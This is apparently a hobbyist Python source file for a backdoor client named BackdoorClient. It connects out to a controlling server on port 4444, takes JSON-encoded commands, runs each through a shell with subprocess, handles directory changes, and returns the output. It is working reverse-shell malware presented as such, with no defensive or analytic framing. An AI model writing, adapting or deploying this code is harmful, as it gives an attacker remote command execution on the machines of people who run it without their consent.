import socket
import json # connect to server
import subprocess
import os

server_host = "localhost" # 192.168.0.81
server_port = 4444

class BackdoorClient:
    def __init__(self, server_host, server_port):
        # starts client and sets variables
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((server_host, server_port))

        self.server_host = server_host
        self.server_port = server_port

        print(f"Connected to {self.server_host}:{self.server_port}")

    def json_send(self, data):
        json_data = json.dumps(data).encode()
        self.connection.send(json_data)
    
    def json_recieve(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue
    
    def execute_order(self, command):
        return subprocess.check_output(command, shell=True).decode('utf-8')
    
    def cd_to(self, path):
        os.chdir(path)
        return f"[Changing current directory to {path}]"

    
    def run(self):
        while True:
            try:
                command = self.json_recieve()
                command_read = command.lower().split()

                if command_read[0] == "exit":
                    self.connection.close()
                    #exit()
                elif command_read[0] == "cd" and len(command_read) > 1:
                    command_output = self.cd_to(command_read[1])
                else:
                    command_output = self.execute_order(command)
                self.json_send(command_output)
            except Exception as e:
                self.json_send("something bad happened oopsies")
                print(f"Something bad happened: {str(e)}")
                continue 

# Creating and running the client
client = BackdoorClient(server_host, server_port)
client.run()
